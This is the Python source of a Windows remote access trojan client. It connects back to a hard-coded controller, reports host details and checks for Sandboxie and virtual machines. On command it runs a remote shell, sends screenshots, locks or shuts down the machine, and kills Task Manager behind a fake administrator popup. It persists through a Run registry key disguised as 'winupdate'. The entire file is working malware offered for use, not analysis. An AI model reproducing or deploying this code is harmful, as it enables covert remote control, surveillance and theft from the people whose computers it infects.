# Imports

import socket
import pyscreeze
import wmi
import os
import sys
import platform
import time
import ctypes
import subprocess
import threading
import win32api
import winerror
import win32event
import win32crypt 
import random
import pyscreeze
from winreg import *
from plyer import *
from shutil import copyfile
from cryptography.fernet import Fernet

# Global
objSocket = socket.socket()
# Some lambda Functions

# Function to decode utf
decode_utf8 = lambda data: data.decode("utf-8")

# Function to recv data
recv = lambda buffer: objSocket.recv(buffer)

# Function to send data
send = lambda data: objSocket.send(data)

# Some configurations

strHost = '192.168.1.8'
# strHost = socket.gethostbyname("")
intPort = 8080

strPath = os.path.realpath(sys.argv[0])

TMP = os.environ['TEMP']
APPDATA = os.environ['APPDATA']

intBuff = 1024

mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

# Function to detect 

def detectSandboxie():
    try:
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
        return " (Sandboxie) "

    except:
        return ""

# Function to detect virtual machine

def detectVM():
    objWMI = wmi.WMI()
    for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return " (Virtual Machine) "
    return ""

# Function to connectect to server

def server_connect():
    while True:
        try:
            objSocket.connect((strHost, intPort))

        except socket.error:
            time.sleep(5)
        
        else:
            break

    struserInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release() + detectSandboxie() + detectVM() + "," + os.environ["USERNAME"]
    
    send(str.encode(struserInfo))

server_connect()

# Function for message box

def MessageBox(message):
    strScript = os.path.join(TMP, "m.vbs")
    with open(strScript, "w") as objVBS:
        objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                     shell=True)

def sendall(data):
    bytEncryptedData = data
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)

def screenshot():
    # Take Screenshot
    pyscreeze.screenshot(TMP + "/s.png")
    send(str.encode("Receiving screenshot..." + "\n" + "File Size: " + str(os.path.getsize(TMP + "/s.png")) + "Byters" + "\n" + "Please wait !"))

    objPic = open(TMP + "/s.png", "rb")
    time.sleep(2)

    send(objPic.read())
    objPic.close()

def lock():
    ctypes.windll.user32.LockWokStation()

def command_shell():
    strCurrentDir = str(os.getcwd())
    send(str.encode((strCurrentDir)))

    while True:
        strData = decode_utf8(recv(intBuff))

        if strData == "goback":
            os.chdir(strCurrentDir)
            break

        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
            objCommand = subprocess.Popen(strData + "& cd", stdout= subprocess.PIPE, stderr=subprocess.PIPE, stdin = subprocess.PIPE, shell=True)

            if objCommand.stderr.read().decode("utf-8") == "":
                strOutput = (objCommand.stdout.read()).decode().splitlines()[0]
                os.chdir(strOutput)

                bytData = f"\n{os.getcwd()}$".encode()

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()

            bytData = (strOutput + b"\n" + os.getcwdb() + b"$")

        else:
            bytData = b"Error !!"

        sendall(bytData)

def vbs_block_process(process, popup=False):
    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
    # popup: list
    # [message, title, timeout, type]

    strVBSCode = "On Error Resume Next\n" + \
                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                 "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
                 f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
                 "objLatestProcess.TargetInstance.Terminate\n"
    if popup:  # if showing a message
        strVBSCode += f'objWshShl.Popup "{popup[0]}", {popup[2]}, "{popup[1]}", {popup[3]}\n'

    strVBSCode += "End If\nLoop"

    strScript = os.path.join(TMP, "d.vbs")

    with open(strScript, "w") as objVBSFile:
        objVBSFile.write(strVBSCode)

    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                     shell=True)  # run the script


def disable_taskmgr():
    global blnDisabled
    if not blnDisabled:  # if task manager is already disabled, enable it
        send(b"Enabling ...")

        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE, shell=True)

        blnDisabled = True
    else:
        send(b"Disabling ...")

        popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]

        vbs_block_process("taskmgr.exe", popup=popup)
        blnDisabled = False

def startup(onstartup):
    try:
        strAppPath = os.path.join(APPDATA, os.path.basename(strPath))
        if not os.getcwd() == APPDATA:
            copyfile(strPath, strAppPath)

        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath)
        CloseKey(objRegKey)
    except WindowsError:
        if not onstartup:
            send(b"Unable to add to startup!")
    else:
        if not onstartup:
            send(b"success")


def remove_from_startup():
    try:
        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
        DeleteValue(objRegKey, "winupdate")
        CloseKey(objRegKey)
    except FileNotFoundError:
        send(b"Program is not registered in startup.")
    except WindowsError:
        send(b"Error removing value!")
    else:
        send(b"success")

while True:
    try:
        while True:
            strData = recv(intBuff)
            strData = decode_utf8(strData)

            if strData == "exit":
                objSocket.close()
                sys.exit(0)

            elif strData[:5] == "msg: ":
                MessageBox(strData)

            elif strData == "screen":
                screenshot()

            elif strData == "lock":
                lock()

            elif strData == "cmd":
                command_shell()

            elif strData == "dtaskmgr":
                if not "blnDisabled" in globals():
                    blnDisabled = True
                disable_taskmgr()

            elif strData == "startup":
                startup(False)

            elif strData == "rmvstartup":
                remove_from_startup()

            elif strData == "exit":
                objSocket.close()
                sys.exit(0)

            elif strData == "shutdown":
                os.system("shutdown /s /t 10 /p")
                MessageBox("Initiating Shutdown in 10 seconds")

            elif strData == "restart":
                os.system("shutdown /r /t 10 /p")
                MessageBox("Initiating restart in 10 seconds")

            else:
                continue

    except socket.error:
        objSocket.close()
        server_connect()
